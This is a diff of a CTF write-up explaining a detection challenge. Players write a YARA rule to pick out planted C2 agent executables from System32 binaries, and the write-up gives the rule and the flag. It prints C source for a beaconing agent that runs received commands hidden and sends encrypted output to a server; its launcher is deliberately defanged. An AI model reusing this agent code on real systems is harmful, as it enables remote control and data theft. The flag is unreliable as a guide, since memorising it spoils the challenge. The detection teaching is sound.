@@ -1,15 +1,16 @@
 # YARA Verificator Writeup
 
-## Overview 
+![](src/description.png)
+
+## Background
+Digital forensics in CTFs is not just disk analyzing. There are also memory forensics, network forensics, steganography (though not practically used anymore), file analysis, etc. I want to introduce a different type of digital forensics in this CTF. This is threat detection forensics challenge. I intentionally made this challenge medium and expected more solves. This writeup will look at the solution for the YARA Verificator challenge. 
+
 ![](src/renamed.png)
 
-Digital forensics in CTFs is not just disk analyzing. There are also memory forensics, network forensics, steganography (though not practically used anymore), file analysis, etc. I want to introduce a different type of digital forensics in this CTF. This is threat detection forensics challenge. 
-
-This is the code i wrote to. 
+The distributed source code for this challenge is as follows.  
 
 The executables generated from this code cannot do anything to your computer because it will immediately be flagged by Windows Security because it uses antivirus software (AV software) like Microsoft Defender Antivirus to scan files and look for malware signatures and suspicious behaviour.  
 
-It is not clean by any chance lol 
 ```C
 #include <windows.h>
 #include <wininet.h>
@@ -26,13 +27,13 @@ void xor_encrypt_decrypt(char* data, size_t length) {
 }
 
 void SendResultToServer(const char* result) {
-	size_t result_len = lstrlenA(result); //copy result to buffer
+	size_t result_len = lstrlenA(result); 
 	char* encrypted = (char*)malloc(result_len + 1);
 	lstrcpyA(encrypted, result);
 
-	xor_encrypt_decrypt(encrypted, result_len); //encrypt
+	xor_encrypt_decrypt(encrypted, result_len);
 
-	HINTERNET hInternet = InternetOpen("Mozilla/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 
 	if (!hInternet) {
 		free(encrypted);
@@ -59,11 +60,9 @@ void SendResultToServer(const char* result) {
 }
 
 void ExecuteCommand(char* cmd) {
-	// use CreateProcess to run command, send output back to server
-
 	SECURITY_ATTRIBUTES sa;
 	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-	sa.bInheritHandle = TRUE; //allow child process to inherit write handle
+	sa.bInheritHandle = TRUE; 
 	sa.lpSecurityDescriptor = NULL;
 
 	HANDLE hStdoutRead, hStdoutWrite;
@@ -73,32 +72,25 @@ void ExecuteCommand(char* cmd) {
 		return;
 	}
 
-	SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0); // read handle is not inherited
-
+	SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0); 
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&si, sizeof(STARTUPINFO));
-
 	si.cb = sizeof(STARTUPINFO);
 	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 	si.hStdOutput = hStdoutWrite;
-	si.wShowWindow = SW_HIDE; //hide console window
-
-
+	si.wShowWindow = SW_HIDE; 
 	char cmdLine[4096];
-	/*snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", cmd);*/
 	lstrcpyA(cmdLine, "notepad.exe /c ");
 	lstrcatA(cmdLine, cmd);
 
 	if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
 		CloseHandle(hStdoutRead);
 		CloseHandle(hStdoutWrite);
-		/*printf("CreateProcess failed\n");*/
 		return;
 	}
 
-	CloseHandle(hStdoutWrite); //close write handle in parent because child has its own copy
-
+	CloseHandle(hStdoutWrite);
 	char buffer[4096];
 	char output[65536] = { 0 };
 	DWORD bytesRead;
@@ -107,7 +99,6 @@ void ExecuteCommand(char* cmd) {
 	while (ReadFile(hStdoutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
 		buffer[bytesRead] = '\0';
 		if (totalLength + bytesRead < sizeof(output) - 1) {
-			/*strncat_s(output, sizeof(output), buffer, _TRUNCATE);
 			totalLength += bytesRead;*/
 			for (DWORD i = 0; i < bytesRead && totalLength < sizeof(output) - 1; i++) {
 				output[totalLength++] = buffer[i];
@@ -116,20 +107,16 @@ void ExecuteCommand(char* cmd) {
 		}
 	}
 
-	WaitForSingleObject(pi.hProcess, INFINITE); // wait process to finish
-
+	WaitForSingleObject(pi.hProcess, INFINITE);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
 	CloseHandle(hStdoutRead);
-
 	SendResultToServer(output);
-
 }
 
 void Beacon() {
-
 	while (1) {
-		HINTERNET hInternet = InternetOpen("Mozilla/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+		HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 
 		if (hInternet) {
 			char url[256];
@@ -161,21 +148,19 @@ int main(void) {
 	Beacon();
 	return 0;
 }
-
-
-//startup info to define stdin, stdout, stderr
 ```
+## Challenge Summary
+In this challenge, we are provided with a set of over 400 executables and dll files. We are asked to write a YARA rule that could detect the malicious files that attacker had implanted. 
 
 There are two sets of data originally that got mixed into one. One set includes all benign .exe (executable) and .dll (Dynamic Link Library) files from `C:\Windows\SYSTEM32`. The other set contains all the "malicious-wannabe" executable files that the source code above generated with a bit of variations for each one just to not duplicate them. 
 
-
 ## solution
-The intended solve is something like this: 
 ```shell
 rule http_c2_agent_sample
 {
     strings:
-        $create_process = "CreateProcess"
+        $user_agent = "Mozilla/5.0"
+	$create_process = "CreateProcess"
         $wininet1 = "InternetOpen"
     condition:
         all of them
@@ -206,5 +191,14 @@ Basically, how to write the detection rules for the correct samples are just to 
 
 To detect this, I wrote a rule that check for the function name "InternetOpen". 
 
+## result
+![](src/image2.png)
+
+The flag is `MINUTEMAN{w3_ju57_l0v3_y37_4n07h3r_r1d1cul0u5_rul3_0300393325}`
+
 Okok I admit this is more a blue team CTF challenge. But as a digital forensist, you need to be detective and collecting pieces of information.  
-As long as you can give all the conditions in the rule, it should return the correct set of unusual executable files. 
+As long as you can give all the conditions in the rule, it should return the correct set of unusual executable files.
+
+
+## Unintended Solve
+One team has the solve for this by 
